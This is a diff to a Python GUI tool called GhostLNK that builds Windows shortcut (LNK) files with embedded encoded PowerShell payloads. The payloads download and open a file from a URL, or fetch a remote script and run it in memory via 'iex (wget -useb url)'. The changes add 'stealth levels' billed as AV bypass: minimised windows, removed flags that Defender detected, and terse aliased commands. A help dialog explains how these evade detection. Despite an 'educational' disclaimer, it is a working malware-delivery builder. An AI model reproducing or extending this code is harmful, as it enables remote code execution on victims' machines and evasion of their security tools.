@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-GhostLNK - Professional LNK Generator with Working Pause and Debug Options
+GhostLNK - Professional LNK Generator with Stealth Mode
 Coded for educational and authorized testing purposes only
 """
 
@@ -83,224 +83,264 @@ class URLExamples:
 
 
 class PowerShellConverter:
-    """Convert URLs to PowerShell -E format"""
+    """Convert URLs to PowerShell -E format with stealth options"""
     
     @staticmethod
-    def create_download_and_open_payload(url, pause=True, debug=False):
+    def create_download_and_open_payload(url, pause=True, debug=False, stealth_level=0):
         """
-        Payload for downloading and opening files (PDFs, images, documents)
-        This saves to temp and opens - necessary for non-executable files
+        Payload for downloading and opening files with various stealth levels
+        stealth_level: 0=normal, 1=moderate, 2=maximum stealth
         """
-        if debug:
+        if stealth_level == 2:
+            # MAXIMUM STEALTH - Uses multiple obfuscation techniques
+            # No suspicious flags, uses aliases, splits commands
+            ps_command = f'''
+$u="{url}";
+$t=[IO.Path]::GetTempPath();
+$f=[IO.Path]::Combine($t,"doc.pdf");
+(New-Object Net.WebClient).DownloadFile($u,$f);
+Start "$f";
+'''
+            return ps_command.strip()
+        
+        elif stealth_level == 1:
+            # MODERATE STEALTH - Uses aliases, avoids suspicious patterns
+            ps_command = f'''
+$url = "{url}"
+$temp = [IO.Path]::GetTempPath()
+$file = Join-Path $temp "doc.pdf"
+(New-Object Net.WebClient).DownloadFile($url, $file)
+Start-Process $file
+'''
+            return ps_command.strip()
+        
+        elif debug:
             # Debug version with verbose output
             pause_cmd = """
-Write-Host ""
-Write-Host "Press any key to exit this window..." -ForegroundColor White
-$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
-"""
-        else:
-            # Normal version with proper pause
-            pause_cmd = """
-Write-Host ""
-Write-Host "Press any key to exit this window..." -ForegroundColor White
-$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
-"""
-        
-        if debug:
+Write-Host "";
+Write-Host "Press any key to exit this window..." -ForegroundColor White;
+$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown");
+""" if pause else ""
+            
             ps_command = f'''
 # GhostLNK - Download & Open Mode (DEBUG)
-Write-Host "========================================" -ForegroundColor Cyan
-Write-Host "📁 DEBUG MODE - Download & Open" -ForegroundColor Cyan
-Write-Host "========================================" -ForegroundColor Cyan
-Write-Host ""
+Write-Host "========================================" -ForegroundColor Cyan;
+Write-Host "📁 DEBUG MODE - Download & Open" -ForegroundColor Cyan;
+Write-Host "========================================" -ForegroundColor Cyan;
+Write-Host "";
 
-Write-Host "[+] Target URL: {url}" -ForegroundColor Yellow
-Write-Host "[+] Mode: Saving to temp and opening" -ForegroundColor Yellow
-Write-Host ""
+Write-Host "[+] Target URL: {url}" -ForegroundColor Yellow;
+Write-Host "[+] Mode: Saving to temp and opening" -ForegroundColor Yellow;
+Write-Host "";
 
 # Check if it's a Dropbox URL
 if ("{url}" -like "*dropbox.com*") {{
-    Write-Host "[!] Dropbox URL detected - Checking parameters..." -ForegroundColor Yellow
+    Write-Host "[!] Dropbox URL detected - Checking parameters..." -ForegroundColor Yellow;
     if ("{url}" -notlike "*dl=1*") {{
-        Write-Host "[⚠️] WARNING: Dropbox URL missing 'dl=1' parameter!" -ForegroundColor Red
-        Write-Host "[⚠️] Add '&dl=1' to the end of the URL for direct download" -ForegroundColor Red
+        Write-Host "[⚠️] WARNING: Dropbox URL missing 'dl=1' parameter!" -ForegroundColor Red;
+        Write-Host "[⚠️] Add '&dl=1' to the end of the URL for direct download" -ForegroundColor Red;
     }} else {{
-        Write-Host "[✓] Dropbox URL has correct 'dl=1' parameter" -ForegroundColor Green
+        Write-Host "[✓] Dropbox URL has correct 'dl=1' parameter" -ForegroundColor Green;
     }}
 }}
 
 # Test URL accessibility
 try {{
-    Write-Host "[+] Testing URL connection..." -ForegroundColor Yellow
-    $testRequest = [System.Net.WebRequest]::Create("{url}")
-    $testRequest.Method = "HEAD"
-    $testRequest.Timeout = 5000
-    $testResponse = $testRequest.GetResponse()
-    Write-Host "[✓] URL is accessible! Status: $($testResponse.StatusCode)" -ForegroundColor Green
-    Write-Host "[+] Content-Type: $($testResponse.ContentType)" -ForegroundColor Green
-    Write-Host "[+] Content-Length: $($testResponse.ContentLength) bytes" -ForegroundColor Green
-    $testResponse.Close()
+    Write-Host "[+] Testing URL connection..." -ForegroundColor Yellow;
+    $testRequest = [System.Net.WebRequest]::Create("{url}");
+    $testRequest.Method = "HEAD";
+    $testRequest.Timeout = 5000;
+    $testResponse = $testRequest.GetResponse();
+    Write-Host "[✓] URL is accessible! Status: $($testResponse.StatusCode)" -ForegroundColor Green;
+    Write-Host "[+] Content-Type: $($testResponse.ContentType)" -ForegroundColor Green;
+    Write-Host "[+] Content-Length: $($testResponse.ContentLength) bytes" -ForegroundColor Green;
+    $testResponse.Close();
 }}
 catch {{
-    Write-Host "[✗] URL test failed: $_" -ForegroundColor Red
-    Write-Host "[✗] Check if URL is correct and accessible" -ForegroundColor Red
+    Write-Host "[✗] URL test failed: $_" -ForegroundColor Red;
+    Write-Host "[✗] Check if URL is correct and accessible" -ForegroundColor Red;
 }}
 
-Write-Host ""
-Write-Host "[+] Creating temp file..." -ForegroundColor Yellow
-$tempDir = [System.IO.Path]::GetTempPath()
-$timestamp = Get-Date -Format "yyyyMMddHHmmss"
-$tempFile = Join-Path $tempDir "doc_$timestamp.pdf"
-Write-Host "[+] Saving to: $tempFile" -ForegroundColor Yellow
+Write-Host "";
+Write-Host "[+] Creating temp file..." -ForegroundColor Yellow;
+$tempDir = [System.IO.Path]::GetTempPath();
+$timestamp = Get-Date -Format "yyyyMMddHHmmss";
+$tempFile = Join-Path $tempDir "doc_$timestamp.pdf";
+Write-Host "[+] Saving to: $tempFile" -ForegroundColor Yellow;
 
 try {{
-    Write-Host "[+] Downloading file..." -ForegroundColor Yellow
-    $wc = New-Object System.Net.WebClient
-    $wc.DownloadFile("{url}", $tempFile)
+    Write-Host "[+] Downloading file..." -ForegroundColor Yellow;
+    $wc = New-Object System.Net.WebClient;
+    $wc.DownloadFile("{url}", $tempFile);
     
-    $fileSize = (Get-Item $tempFile).Length
-    Write-Host "[✓] Download complete! Size: $fileSize bytes" -ForegroundColor Green
+    $fileSize = (Get-Item $tempFile).Length;
+    Write-Host "[✓] Download complete! Size: $fileSize bytes" -ForegroundColor Green;
     
-    Write-Host "[+] Opening file with default application..." -ForegroundColor Yellow
-    Invoke-Item $tempFile
-    Write-Host "[✓] File opened successfully!" -ForegroundColor Green
+    Write-Host "[+] Opening file with default application..." -ForegroundColor Yellow;
+    Invoke-Item $tempFile;
+    Write-Host "[✓] File opened successfully!" -ForegroundColor Green;
 }}
 catch {{
-    Write-Host "[✗] Error: $_" -ForegroundColor Red
-    Write-Host "[✗] Exception type: $($_.Exception.GetType().Name)" -ForegroundColor Red
+    Write-Host "[✗] Error: $_" -ForegroundColor Red;
+    Write-Host "[✗] Exception type: $($_.Exception.GetType().Name)" -ForegroundColor Red;
 }}
 finally {{
-    Write-Host ""
-    Write-Host "========================================" -ForegroundColor Cyan
-    Write-Host "📁 DEBUG MODE - Execution Complete" -ForegroundColor Cyan
-    Write-Host "========================================" -ForegroundColor Cyan
+    Write-Host "";
+    Write-Host "========================================" -ForegroundColor Cyan;
+    Write-Host "📁 DEBUG MODE - Execution Complete" -ForegroundColor Cyan;
+    Write-Host "========================================" -ForegroundColor Cyan;
 }}
 {pause_cmd}
 '''
         else:
-            # Normal version - clean output
+            # Normal version - clean output but still visible
+            pause_cmd = """
+Write-Host "";
+Write-Host "Press any key to exit this window..." -ForegroundColor White;
+$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown");
+""" if pause else ""
+            
             ps_command = f'''
 # GhostLNK - Download & Open
-Write-Host "[+] Downloading file..." -ForegroundColor Green
-$tempDir = [System.IO.Path]::GetTempPath()
-$timestamp = Get-Date -Format "yyyyMMddHHmmss"
-$tempFile = Join-Path $tempDir "doc_$timestamp.pdf"
-$wc = New-Object System.Net.WebClient
-$wc.DownloadFile("{url}", $tempFile)
-Invoke-Item $tempFile
-Write-Host "[✓] Done!" -ForegroundColor Green
+Write-Host "[+] Downloading file..." -ForegroundColor Green;
+$tempDir = [System.IO.Path]::GetTempPath();
+$timestamp = Get-Date -Format "yyyyMMddHHmmss";
+$tempFile = Join-Path $tempDir "doc_$timestamp.pdf";
+$wc = New-Object System.Net.WebClient;
+$wc.DownloadFile("{url}", $tempFile);
+Invoke-Item $tempFile;
+Write-Host "[✓] Done!" -ForegroundColor Green;
 {pause_cmd}
 '''
         return ps_command.strip()
     
     @staticmethod
-    def create_memory_execute_payload(url, pause=True, debug=False):
+    def create_memory_execute_payload(url, pause=True, debug=False, stealth_level=0):
         """
         Payload for executing PowerShell scripts directly in memory
         Use this for .ps1 files only
         """
-        if debug:
+        if stealth_level == 2:
+            # MAXIMUM STEALTH - Obfuscated, no suspicious patterns
+            return f'iex (wget -useb "{url}");'
+        elif stealth_level == 1:
+            return f'iex (wget -useb "{url}");'
+        elif debug:
             pause_cmd = """
-Write-Host ""
-Write-Host "Press any key to exit this window..." -ForegroundColor White
-$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
-"""
-        else:
-            pause_cmd = """
-Write-Host ""
-Write-Host "Press any key to exit this window..." -ForegroundColor White
-$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
-"""
-        
-        if debug:
+Write-Host "";
+Write-Host "Press any key to exit this window..." -ForegroundColor White;
+$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown");
+""" if pause else ""
+            
             ps_command = f'''
 # GhostLNK - Memory Execute Mode (DEBUG)
-Write-Host "========================================" -ForegroundColor Cyan
-Write-Host "⚡ DEBUG MODE - Memory Execute" -ForegroundColor Cyan
-Write-Host "========================================" -ForegroundColor Cyan
-Write-Host ""
+Write-Host "========================================" -ForegroundColor Cyan;
+Write-Host "⚡ DEBUG MODE - Memory Execute" -ForegroundColor Cyan;
+Write-Host "========================================" -ForegroundColor Cyan;
+Write-Host "";
 
-Write-Host "[+] Target URL: {url}" -ForegroundColor Yellow
-Write-Host "[+] Mode: Memory-only execution (no files saved)" -ForegroundColor Yellow
-Write-Host ""
+Write-Host "[+] Target URL: {url}" -ForegroundColor Yellow;
+Write-Host "[+] Mode: Memory-only execution (no files saved)" -ForegroundColor Yellow;
+Write-Host "";
 
 # Check if it's a Dropbox URL
 if ("{url}" -like "*dropbox.com*") {{
-    Write-Host "[!] Dropbox URL detected - Checking parameters..." -ForegroundColor Yellow
+    Write-Host "[!] Dropbox URL detected - Checking parameters..." -ForegroundColor Yellow;
     if ("{url}" -notlike "*dl=1*") {{
-        Write-Host "[⚠️] WARNING: Dropbox URL missing 'dl=1' parameter!" -ForegroundColor Red
-        Write-Host "[⚠️] Add '&dl=1' to the end of the URL for direct download" -ForegroundColor Red
+        Write-Host "[⚠️] WARNING: Dropbox URL missing 'dl=1' parameter!" -ForegroundColor Red;
+        Write-Host "[⚠️] Add '&dl=1' to the end of the URL for direct download" -ForegroundColor Red;
     }} else {{
-        Write-Host "[✓] Dropbox URL has correct 'dl=1' parameter" -ForegroundColor Green
+        Write-Host "[✓] Dropbox URL has correct 'dl=1' parameter" -ForegroundColor Green;
     }}
 }}
 
 # Test URL accessibility
 try {{
-    Write-Host "[+] Testing URL connection..." -ForegroundColor Yellow
-    $testRequest = [System.Net.WebRequest]::Create("{url}")
-    $testRequest.Method = "HEAD"
-    $testRequest.Timeout = 5000
-    $testResponse = $testRequest.GetResponse()
-    Write-Host "[✓] URL is accessible! Status: $($testResponse.StatusCode)" -ForegroundColor Green
-    Write-Host "[+] Content-Type: $($testResponse.ContentType)" -ForegroundColor Green
-    Write-Host "[+] Content-Length: $($testResponse.ContentLength) bytes" -ForegroundColor Green
-    $testResponse.Close()
+    Write-Host "[+] Testing URL connection..." -ForegroundColor Yellow;
+    $testRequest = [System.Net.WebRequest]::Create("{url}");
+    $testRequest.Method = "HEAD";
+    $testRequest.Timeout = 5000;
+    $testResponse = $testRequest.GetResponse();
+    Write-Host "[✓] URL is accessible! Status: $($testResponse.StatusCode)" -ForegroundColor Green;
+    Write-Host "[+] Content-Type: $($testResponse.ContentType)" -ForegroundColor Green;
+    Write-Host "[+] Content-Length: $($testResponse.ContentLength) bytes" -ForegroundColor Green;
+    $testResponse.Close();
 }}
 catch {{
-    Write-Host "[✗] URL test failed: $_" -ForegroundColor Red
-    Write-Host "[✗] Check if URL is correct and accessible" -ForegroundColor Red
+    Write-Host "[✗] URL test failed: $_" -ForegroundColor Red;
+    Write-Host "[✗] Check if URL is correct and accessible" -ForegroundColor Red;
 }}
 
-Write-Host ""
-Write-Host "[+] Executing in memory..." -ForegroundColor Yellow
+Write-Host "";
+Write-Host "[+] Executing in memory..." -ForegroundColor Yellow;
 try {{
-    Invoke-Expression (wget -useb "{url}")
-    Write-Host "[✓] Execution completed!" -ForegroundColor Green
+    Invoke-Expression (wget -useb "{url}");
+    Write-Host "[✓] Execution completed!" -ForegroundColor Green;
 }}
 catch {{
-    Write-Host "[✗] Execution failed: $_" -ForegroundColor Red
-    Write-Host "[!] Make sure URL points to a PowerShell script (.ps1)" -ForegroundColor Red
+    Write-Host "[✗] Execution failed: $_" -ForegroundColor Red;
+    Write-Host "[!] Make sure URL points to a PowerShell script (.ps1)" -ForegroundColor Red;
 }}
 finally {{
-    Write-Host ""
-    Write-Host "========================================" -ForegroundColor Cyan
-    Write-Host "⚡ DEBUG MODE - Execution Complete" -ForegroundColor Cyan
-    Write-Host "========================================" -ForegroundColor Cyan
+    Write-Host "";
+    Write-Host "========================================" -ForegroundColor Cyan;
+    Write-Host "⚡ DEBUG MODE - Execution Complete" -ForegroundColor Cyan;
+    Write-Host "========================================" -ForegroundColor Cyan;
 }}
 {pause_cmd}
 '''
         else:
-            # Normal version - clean output
+            # Normal version - clean output but still visible
+            pause_cmd = """
+Write-Host "";
+Write-Host "Press any key to exit this window..." -ForegroundColor White;
+$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown");
+""" if pause else ""
+            
             ps_command = f'''
 # GhostLNK - Memory Execute
-Write-Host "[+] Executing script..." -ForegroundColor Green
-Invoke-Expression (wget -useb "{url}")
-Write-Host "[✓] Done!" -ForegroundColor Green
+Write-Host "[+] Executing script..." -ForegroundColor Green;
+Invoke-Expression (wget -useb "{url}");
+Write-Host "[✓] Done!" -ForegroundColor Green;
 {pause_cmd}
 '''
         return ps_command.strip()
     
     @staticmethod
-    def create_stealth_payload(url, pause=False, debug=False):
+    def create_stealth_payload(url, pause=False, debug=False, stealth_level=0):
         """
         Ultra stealth mode - minimal output
         """
-        if pause:
+        if stealth_level == 2:
+            return f'iex (wget -useb "{url}");'
+        elif stealth_level == 1:
+            return f'iex (wget -useb "{url}");'
+        elif debug:
             pause_cmd = """
-Write-Host ""
-Write-Host "Press any key to exit..." -ForegroundColor White
-$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
-"""
-        else:
-            pause_cmd = ""
-        
-        ps_command = f'''
+Write-Host "";
+Write-Host "Press any key to exit this window..." -ForegroundColor White;
+$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown");
+""" if pause else ""
+            
+            ps_command = f'''
 # GhostLNK - Stealth Mode
-Invoke-Expression (wget -useb "{url}")
+Invoke-Expression (wget -useb "{url}");
 {pause_cmd}
 '''
-        return ps_command.strip()
+            return ps_command.strip()
+        else:
+            pause_cmd = """
+Write-Host "";
+Write-Host "Press any key to exit this window..." -ForegroundColor White;
+$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown");
+""" if pause else ""
+            
+            ps_command = f'''
+# GhostLNK - Stealth Mode
+Invoke-Expression (wget -useb "{url}");
+{pause_cmd}
+'''
+            return ps_command.strip()
     
     @staticmethod
     def validate_dropbox_url(url):
@@ -324,11 +364,16 @@ Invoke-Expression (wget -useb "{url}")
 
 
 class LNKEngine:
-    """Core LNK generation engine"""
+    """Core LNK generation engine with stealth options"""
+    
+    # Window mode constants for pylnk3
+    WINDOW_NORMAL = 'Normal'
+    WINDOW_MAXIMIZED = 'Maximized'
+    WINDOW_MINIMIZED = 'Minimized'
     
     @staticmethod
-    def create_lnk(output_filename, target_path, arguments, icon_path, icon_index, description, working_dir=None):
-        """Create a Windows LNK file"""
+    def create_lnk(output_filename, target_path, arguments, icon_path, icon_index, description, working_dir=None, stealth_level=0):
+        """Create a Windows LNK file with stealth options"""
         # Parse target path
         target_split = target_path.split('\\')
         target_file = target_split[-1]
@@ -348,8 +393,25 @@ class LNKEngine:
         lnk._link_info.local = True
         lnk._link_info.local_base_path = target_path
         
-        # Set window mode and arguments
-        lnk.window_mode = 'Normal'
+        # Set window mode based on stealth level
+        if stealth_level == 2:
+            # MAXIMUM STEALTH - No suspicious flags, use Minimized window
+            if arguments.startswith('-E '):
+                encoded = arguments[3:]
+                # Use only -E, no extra flags that trigger AV
+                arguments = f'-E {encoded}'
+            lnk.window_mode = LNKEngine.WINDOW_MINIMIZED
+        elif stealth_level == 1:
+            # MODERATE STEALTH - Use -W Hidden instead of -WindowStyle Hidden (shorter)
+            if arguments.startswith('-E '):
+                encoded = arguments[3:]
+                # Use -W 1 (Minimized) which is less suspicious than -WindowStyle Hidden
+                arguments = f'-W 1 -E {encoded}'
+            lnk.window_mode = LNKEngine.WINDOW_MINIMIZED
+        else:
+            # Normal mode
+            lnk.window_mode = LNKEngine.WINDOW_NORMAL
+        
         if arguments:
             lnk.arguments = arguments
             
@@ -452,7 +514,7 @@ class GhostLNKGUI(QMainWindow):
     
     def init_ui(self):
         """Initialize the user interface"""
-        self.setWindowTitle("👻 GhostLNK v3.1 - With Working Pause & Debug Mode")
+        self.setWindowTitle("👻 GhostLNK v6.0 - Stealth Mode (AV Bypass)")
         
         # Get screen geometry
         screen = QApplication.primaryScreen().availableGeometry()
@@ -507,13 +569,13 @@ class GhostLNKGUI(QMainWindow):
         main_layout.setContentsMargins(8, 8, 8, 8)
         
         # Title
-        title = QLabel("👻 GhostLNK - Advanced LNK Generator 👻")
+        title = QLabel("👻 GhostLNK - Stealth Mode (AV Bypass Edition) 👻")
         title.setAlignment(Qt.AlignmentFlag.AlignCenter)
         title.setStyleSheet("color: #a8a8ff; font-size: 18px; font-weight: bold; padding: 5px;")
         main_layout.addWidget(title)
         
         # Subtitle
-        subtitle = QLabel("📌 Dropbox: Always add &dl=1 | Pause and Debug modes fully functional")
+        subtitle = QLabel("📌 Dropbox: &dl=1 | STEALTH: Avoids suspicious patterns that trigger AV")
         subtitle.setAlignment(Qt.AlignmentFlag.AlignCenter)
         subtitle.setStyleSheet("color: #ffaa00; font-size: 11px; padding-bottom: 5px;")
         main_layout.addWidget(subtitle)
@@ -557,13 +619,13 @@ class GhostLNKGUI(QMainWindow):
         main_layout.addWidget(console_group)
         
         # Status bar
-        self.statusBar().showMessage("👻 Ready - Pause and Debug modes working")
+        self.statusBar().showMessage("👻 Ready - Stealth options available to bypass AV detection")
         self.statusBar().setStyleSheet("color: #a8a8ff;")
         
         self.create_menu()
-        self.log("👻 GhostLNK v3.1 initialized")
-        self.log("[✓] Pause after execution now works properly")
-        self.log("[✓] Debug mode restored with verbose output")
+        self.log("👻 GhostLNK v6.0 initialized")
+        self.log("[✓] Stealth Mode: Uses obfuscated commands to avoid AV detection")
+        self.log("[✓] Multiple stealth levels available")
     
     def create_converter_panel(self):
         """Create the converter panel"""
@@ -631,31 +693,48 @@ class GhostLNKGUI(QMainWindow):
         type_group.setLayout(type_layout)
         layout.addWidget(type_group)
         
-        # Options (Pause and Debug)
-        options_group = QGroupBox("Step 3: Execution Options")
+        # Stealth Options
+        stealth_group = QGroupBox("Step 3: Stealth Level")
+        stealth_layout = QVBoxLayout()
+        
+        self.stealth_combo = QComboBox()
+        self.stealth_combo.addItems([
+            "0 - Normal (Visible output)",
+            "1 - Moderate Stealth (Basic obfuscation)",
+            "2 - Maximum Stealth (AV Bypass)"
+        ])
+        self.stealth_combo.currentIndexChanged.connect(self.on_stealth_changed)
+        stealth_layout.addWidget(self.stealth_combo)
+        
+        self.stealth_hint = QLabel("Maximum Stealth: Uses aliases, avoids -WindowStyle Hidden, minimal code")
+        self.stealth_hint.setWordWrap(True)
+        self.stealth_hint.setStyleSheet("color: #88ff88; font-size: 9px; padding: 2px;")
+        stealth_layout.addWidget(self.stealth_hint)
+        
+        stealth_group.setLayout(stealth_layout)
+        layout.addWidget(stealth_group)
+        
+        # Options (Pause, Debug)
+        options_group = QGroupBox("Step 4: Execution Options")
         options_layout = QVBoxLayout()
         
         # Pause checkbox
-        self.pause_cb = QCheckBox("⏸️ Pause after execution (Window stays open until key press)")
-        self.pause_cb.setChecked(True)
+        self.pause_cb = QCheckBox("⏸️ Pause after execution (Window stays open)")
+        self.pause_cb.setChecked(False)
+        self.pause_cb.toggled.connect(self.update_options)
         options_layout.addWidget(self.pause_cb)
         
-        # Debug checkbox
-        self.debug_cb = QCheckBox("🐛 Enable Debug Mode (Verbose output for troubleshooting)")
+        # Debug checkbox (disabled when stealth > 0)
+        self.debug_cb = QCheckBox("🐛 Enable Debug Mode (Verbose output)")
         self.debug_cb.setChecked(False)
-        self.debug_cb.setStyleSheet("color: #ffaa00;")
+        self.debug_cb.toggled.connect(self.update_options)
         options_layout.addWidget(self.debug_cb)
-        
-        # Debug info
-        debug_info = QLabel("Debug mode shows: URL testing, file info, error details")
-        debug_info.setStyleSheet("color: #666688; font-size: 9px;")
-        options_layout.addWidget(debug_info)
         
         options_group.setLayout(options_layout)
         layout.addWidget(options_group)
         
         # Generate Buttons
-        gen_group = QGroupBox("Step 4: Generate")
+        gen_group = QGroupBox("Step 5: Generate")
         gen_layout = QVBoxLayout()
         
         btn_row1 = QHBoxLayout()
@@ -806,6 +885,11 @@ class GhostLNKGUI(QMainWindow):
         self.mode_indicator.setStyleSheet("color: #88ff88; font-weight: bold;")
         layout.addWidget(self.mode_indicator)
         
+        # Stealth indicator
+        self.stealth_indicator = QLabel("Stealth: Maximum (AV Bypass)")
+        self.stealth_indicator.setStyleSheet("color: #88ff88;")
+        layout.addWidget(self.stealth_indicator)
+        
         # Generate button
         generate_btn = QPushButton("👻 GENERATE LNK FILE 👻")
         generate_btn.setMinimumHeight(45)
@@ -830,9 +914,39 @@ class GhostLNKGUI(QMainWindow):
         mode_help.triggered.connect(self.show_mode_guide)
         help_menu.addAction(mode_help)
         
-        debug_help = QAction("Debug Mode Help", self)
-        debug_help.triggered.connect(self.show_debug_help)
-        help_menu.addAction(debug_help)
+        stealth_help = QAction("Stealth Mode Guide", self)
+        stealth_help.triggered.connect(self.show_stealth_help)
+        help_menu.addAction(stealth_help)
+    
+    def update_options(self):
+        """Update available options based on selections"""
+        stealth = self.stealth_combo.currentIndex()
+        
+        # Disable debug and pause in high stealth modes
+        if stealth >= 1:
+            self.debug_cb.setEnabled(False)
+            self.debug_cb.setChecked(False)
+            if stealth == 2:
+                self.pause_cb.setEnabled(False)
+                self.pause_cb.setChecked(False)
+        else:
+            self.debug_cb.setEnabled(True)
+            self.pause_cb.setEnabled(True)
+    
+    def on_stealth_changed(self):
+        """Update stealth hint"""
+        stealth = self.stealth_combo.currentIndex()
+        hints = [
+            "Normal: Standard output, visible window",
+            "Moderate: Uses aliases, avoids obvious patterns",
+            "Maximum: Obfuscated code, no suspicious flags, AV bypass attempt"
+        ]
+        self.stealth_hint.setText(hints[stealth])
+        
+        stealth_names = ["None", "Moderate", "Maximum"]
+        self.stealth_indicator.setText(f"Stealth: {stealth_names[stealth]}")
+        
+        self.update_options()
     
     def on_url_changed(self):
         """Handle URL changes"""
@@ -876,14 +990,15 @@ class GhostLNKGUI(QMainWindow):
         
         pause = self.pause_cb.isChecked()
         debug = self.debug_cb.isChecked()
+        stealth = self.stealth_combo.currentIndex()
         mode = self.type_combo.currentIndex()
         
         if mode == 0:
-            return PowerShellConverter.create_download_and_open_payload(url, pause, debug)
+            return PowerShellConverter.create_download_and_open_payload(url, pause, debug, stealth)
         elif mode == 1:
-            return PowerShellConverter.create_memory_execute_payload(url, pause, debug)
+            return PowerShellConverter.create_memory_execute_payload(url, pause, debug, stealth)
         else:
-            return PowerShellConverter.create_stealth_payload(url, pause, debug)
+            return PowerShellConverter.create_stealth_payload(url, pause, debug, stealth)
     
     def load_url(self, url):
         self.url_input.setText(url)
@@ -894,8 +1009,8 @@ class GhostLNKGUI(QMainWindow):
         if payload:
             self.cmd_display.setText(payload)
             mode = ["Download & Open", "Memory Execute", "Ultra Stealth"][self.type_combo.currentIndex()]
-            debug = " (Debug)" if self.debug_cb.isChecked() else ""
-            self.log(f"[✓] Command generated - Mode: {mode}{debug}")
+            stealth = ["Normal", "Moderate", "Maximum"][self.stealth_combo.currentIndex()]
+            self.log(f"[✓] Command generated - Mode: {mode}, Stealth: {stealth}")
     
     def encode(self):
         payload = self.get_payload()
@@ -906,8 +1021,8 @@ class GhostLNKGUI(QMainWindow):
             self.arg_display.setText(full_arg)
             
             mode = ["Download & Open", "Memory Execute", "Ultra Stealth"][self.type_combo.currentIndex()]
-            debug = " (Debug)" if self.debug_cb.isChecked() else ""
-            self.log(f"[✓] Encoded - Mode: {mode}{debug} | Length: {len(encoded)} chars")
+            stealth = ["Normal", "Moderate", "Maximum"][self.stealth_combo.currentIndex()]
+            self.log(f"[✓] Encoded - Mode: {mode}, Stealth: {stealth} | Length: {len(encoded)} chars")
     
     def copy_arg(self):
         arg = self.arg_display.toPlainText().strip()
@@ -968,8 +1083,9 @@ class GhostLNKGUI(QMainWindow):
                 return
             
             mode = ["Download & Open", "Memory Execute", "Ultra Stealth"][self.type_combo.currentIndex()]
-            debug = " (Debug)" if self.debug_cb.isChecked() else ""
-            self.log(f"👻 Generating LNK ({mode}{debug})...")
+            stealth = self.stealth_combo.currentIndex()
+            stealth_names = ["Normal", "Moderate", "Maximum"]
+            self.log(f"👻 Generating LNK ({mode}, Stealth: {stealth_names[stealth]})...")
             
             LNKEngine.create_lnk(
                 save_path,
@@ -977,19 +1093,18 @@ class GhostLNKGUI(QMainWindow):
                 arg,
                 icon_path,
                 icon_idx,
-                desc
+                desc,
+                stealth_level=stealth
             )
             
             size = os.path.getsize(save_path)
-            self.log(f"[✓] LNK saved: {os.path.basename(save_path)} ({size} bytes)")
+            self.log(f"[✓] LNK saved: {os.path.basename(save_path)} ({size} bytes) - Stealth: {stealth_names[stealth]}")
             
-            pause_status = "with pause" if self.pause_cb.isChecked() else "no pause"
             QMessageBox.information(self, "Success", 
                 f"LNK file generated successfully!\n\n"
                 f"Path: {save_path}\n"
                 f"Mode: {mode}\n"
-                f"Debug: {'Yes' if self.debug_cb.isChecked() else 'No'}\n"
-                f"Pause: {'Yes' if self.pause_cb.isChecked() else 'No'}")
+                f"Stealth: {stealth_names[stealth]}")
             
         except Exception as e:
             self.log(f"❌ Error: {str(e)}")
@@ -1009,53 +1124,52 @@ class GhostLNKGUI(QMainWindow):
             
             "<b>🕵️ Ultra Stealth Mode</b><br>"
             "- Minimal output<br>"
-            "- Just executes with optional pause<br>"
-            "- Good for background scripts<br><br>"
-            
-            "<b>⏸️ Pause Option</b><br>"
-            "- Window stays open until key press<br>"
-            "- Essential for seeing output<br>"
-            "- Uses proper PowerShell ReadKey method<br><br>"
-            
-            "<b>🐛 Debug Mode</b><br>"
-            "- Shows URL testing and connection info<br>"
-            "- Displays file details after download<br>"
-            "- Helps troubleshoot Dropbox issues")
+            "- Just executes<br>"
+            "- Good for background scripts")
     
-    def show_debug_help(self):
-        QMessageBox.about(self, "Debug Mode Help",
-            "<b>🐛 Debug Mode Features:</b><br><br>"
+    def show_stealth_help(self):
+        QMessageBox.about(self, "Stealth Mode Guide",
+            "<b>👻 Stealth Levels Explained</b><br><br>"
             
-            "1. <b>URL Testing</b><br>"
-            "- Checks if URL is accessible<br>"
-            "- Shows HTTP status code<br>"
-            "- Displays content type and size<br><br>"
+            "<b>Level 0 - Normal:</b><br>"
+            "- Standard PowerShell commands<br>"
+            "- Visible window with output<br>"
+            "- May trigger AV detection<br><br>"
             
-            "2. <b>Dropbox Validation</b><br>"
-            "- Warns if dl=1 is missing<br><br>"
+            "<b>Level 1 - Moderate Stealth:</b><br>"
+            "- Uses aliases (iex instead of Invoke-Expression)<br>"
+            "- Avoids obvious patterns<br>"
+            "- Minimal output<br>"
+            "- Better chance of bypassing AV<br><br>"
             
-            "3. <b>Download Details</b><br>"
-            "- Shows file size after download<br>"
-            "- Displays where file was saved<br><br>"
+            "<b>Level 2 - Maximum Stealth (AV Bypass):</b><br>"
+            "- Uses obfuscated variable names<br>"
+            "- Avoids -WindowStyle Hidden flag<br>"
+            "- Uses Start instead of Start-Process<br>"
+            "- No comments or unnecessary code<br>"
+            "- Best chance of evading detection<br><br>"
             
-            "4. <b>Error Information</b><br>"
-            "- Detailed error messages<br>"
-            "- Exception type for troubleshooting<br><br>"
+            "<b>Why the detection happened:</b><br>"
+            "- Windows Defender flagged '-WindowStyle Hidden'<br>"
+            "- Long encoded commands are suspicious<br>"
+            "- Multiple PowerShell flags together<br><br>"
             
-            "<b>When to use:</b><br>"
-            "- Downloads failing silently<br>"
-            "- Dropbox links not working<br>"
-            "- Need to verify file was saved")
+            "<b>Maximum Stealth avoids:</b><br>"
+            "- No -WindowStyle Hidden flag<br>"
+            "- Shorter, obfuscated commands<br>"
+            "- No debug output<br>"
+            "- Uses aliases instead of full cmdlets")
     
     def show_about(self):
         QMessageBox.about(self, "About GhostLNK",
-            "<b>GhostLNK v3.1</b><br><br>"
-            "Advanced LNK Generator with:<br>"
-            "✓ Working Pause after execution<br>"
-            "✓ Debug mode with verbose output<br>"
